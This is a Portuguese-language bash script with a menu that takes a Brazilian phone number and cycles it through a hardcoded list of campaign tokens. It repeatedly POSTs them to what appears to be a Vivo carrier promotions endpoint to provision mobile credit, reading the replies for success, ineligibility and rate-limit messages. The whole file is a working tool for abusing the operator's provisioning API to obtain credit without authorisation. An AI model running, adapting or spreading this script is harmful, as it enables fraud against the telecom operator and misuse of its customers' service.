#!/bin/bash

clear
sleep 1


tit=$"{MD}>PDW$1🐊"

tokens=$(echo "4bb5cf73-4c98-4b26-9207-2d91a663c326
91e22bd5-7b79-4fef-8dfa-c40f1ff3736b
f922b71c-8b48-4363-a9fd-74c0757c161d
6c360891-8ce5-45ba-a2c3-97e0a7139d99
93757d08-72e9-4688-bab0-5b8e7b5a63a1
91e22bd5-7b79-4fef-8dfa-c40f1ff3736b
6e7eb039-9816-4118-9c3b-bb906887722c
6c360891-8ce5-45ba-a2c3-97e0a7139d99
02f76cd1-eead-44ff-88dd-aa69538c7aef
5e2c338b-f271-4691-9fe7-d09148b851cc
883bc544-fff3-425a-b809-c79562d8deaa
5c2d7a97-8a88-4d79-9f2e-37a8e94a0f1e")
veri=$(echo -e "\e[01;37m Opção: \e[0m") # Opção:
veri2=$(echo -e "\e[01;37m Número: \e[0m") # Número:
veri3=$(echo --e e "\e[01;37m Vezes: \e[0m") # Vezes:
while :; do
clear && echo -e $tit
   echo -e "\e[01;30;40m
            __...---  .---. •---'-.
  ~ -~ -.-  __.--  _.'( | ).  •.  •._▪︎
 -.~~ .     _ .--   ._•---'_.-.  -.   -.
  ~ ~_~-~-~_ ~ -._ -._..---. -.    .-._ ...
    ~- ~ ~ -_ -~ ~ -.._ _ _ _ ..-_ ..  •-._----.._ Private_V2🐊
     ~~-~ ~-_ _~ ~-~ ~ -~ _~~_-~ -._  ▪︎-.  -. •-._----.._.--'. ~ -~_
Seu crédito ~~ -~_-~ _~- _~~ _~-_~ ~-_~~ ~-.___    -._   -.__    .  . ~ -_~
             ~~ _~- ~~- -_~  ~- ~ - _~~- _~~ ~---...__ _    ._ .   . ~-_~
                ~ ~- _~~- _-_~ ~-_ ~-~ ~_-~ _~- ~_~-_~  ~--.....--~ -~_ ~
                     ~ ~ - ~  ~ ~~ - ~~-  ~~- ~-  ~ -~ ~ ~ -~~-  ~- ~-~ \e[0m"; sleep .4; echo
echo -e "                            < \e[01;31mNO PIQUE DO CV!\e[0m >        "
echo -e "[1]\e[33m\e[01;32mBote seu crédito\e[0m\c"; echo -e "  \e[02;03;37m MD O chef!\e[0m"


   read -n1 -p "$veri" verifica; echo
    case $verifica in # case MENU

       1) while :; do
           clear && echo -e $tit
           echo -e "\e[01;37;41m           PRIVATE_V2🐊           \e[0m"; sleep .4; echo
           qtdtokens=$(echo "$tokens"| wc -l)
               echo -e "\e[01;37;41m Coloque DDD+NÚMERO \e[0m"
           while :; do
           read -p "$veri2" NUMERO; sleep .5
           limite=$(echo $NUMERO | wc -m)
                  case $limite in
                       12) break;;
                        *) echo -e "\e[01;33m Bote 11 digitos\e[0m"; sleep .2
                  esac
           done
           clear && echo -e $tit
           echo -e "\e[01;37;41m           PRIVATE_LACOXTE           \e[0m"; sleep .4; echo
           echo -e "\e[07;01;37;40m NUMERO \e[01;31;47m $NUMERO \e[0m"; sleep .5; echo
              for o in $(seq $qtdtokens);
                 do
                  case $o in
                  $qtdtokens) mssg=$(echo "Agua rosa ><");;
                           *) mssg=$(echo "MAIS")
                  esac
           VEZES=5
           tokens1=("sed '"$o"p; d'")
           tokens2=$(echo "$tokens" | eval $tokens1)
           echo -e "\e[07;01;37;40m   T O K E N \e[01;36;40m $o \e[0m"
           echo -e "\e[01;32m TOKEN \e[01;37m: \e[0m\e[01;04;37m$tokens2\e[0m"
              for i in $(seq $VEZES);
                do
           response=$(data=$"msdisn=55$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess.php" && curl -s "$site" -d "$data")
           body=$(echo $response | jq '.code')           
           grepi1=$(echo $response | grep -c "Not eligible")
                 case $grepi1 in
                      1) echo -e "\e[01;33m calma barboleta\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 25; echo; break;;
                      *)
                 esac
           grepi2=$(echo $response | grep -c "packprovisionOK")
                case $grepi2 in
                     1) echo -e "\e[01;32m Sucesso, PDW$1\e[0m / \e[01;37mmais: $i\e[0m"|pv -qL 25;;
                     *)
                esac
           grepi3=$(echo $response | grep -c "Invalid Campaign")
                 case $grepi3 in
                      1) echo -e "\e[01;33m Aí papai\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 25; echo; break;;
                      *)
                 esac
           grepi4=$(echo $response | grep -c "Transaction limit exceeded")
                 case $grepi4 in
                      1) echo -e "\e[01;32m MUITAS TENTATIVAS NESSE TOKEN HOJE\e[0m / \e[01;37mmais: $i\e[0m"|pv -qL 25;;
                      *)
                 esac
           grepi5=$(echo $response | grep -c "7x1 elegibility")
                 case $grepi5 in
                      1) echo -e "\e[01;32m logo terá atualização no EhisOpeNer\e[0m / \e[01;37mmais: $i\e[0m"|pv -qL 25;;
                      *)
                 esac
              done
           done
           echo -e "         ≡ \e[01;37mO P Ç Õ E S\e[0m ≡"
           echo -e "  \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
           echo -e "  \e[01;37m〘*1*〙\e[0m\e[01;33mREPETIR TESTADOR PADRÃO\e[0m\c"; echo -e "\e[02;03;37m Apenas cole o numero\e[0m"
           echo -e "  \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
           echo -e "  \e[01;37m『*2*』\e[0m\e[01;33mVOLTAR PARA O MENU\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
           echo -e "  \e[01;37m『*0*』\e[0m\e[01;33mCAIR FORA DO SCRIPT\e[0m\c"; echo -e "\e[02;03;37m     Noob sofre\e[0m"
           echo -e "  \e[00;31m═══════════════════════════════\e[0"
        while :; do
             read -n1 -p "$veri" opc2; echo
                 case $opc2 in
                      1) break;;
                      2) break;;
                      0) rm mb2 > /dev/null 2>&1; echo -e "\e[01;37m<MD> | +5592991536110\e[0m"; echo -e "\e[01;33mPara iniciar novamente digite: ./principal\e[0m"|pv -qL 20; exit;;
                      *) echo -e "\e[01;37;41m ESPERA! \e[0m"; sleep 1
                 esac
            done
                 case $opc2 in
                      2) break
                 esac
           done;;
9) tail -n +120 principal > principal1 && head -n +28 principal1 > principal2 && rm principal1 && chmod +x principal2 && break;;
       0) rm principal2 > /dev/null 2>&1; echo -e "\e[01;37m•MD• | +5592991536110\e[0m"; echo -e "\e[01;33mPara iniciar novamente digite: ./principal\e[0m"|pv -qL 20; break;;
       *) echo -e "\e[01;37;41m CALMA MOXIN<3 \e[0m"; sleep 1
    esac # case MENU
done # primeiro loop
case $verifica in
     9) ./principal2;;
     0) exit
esac
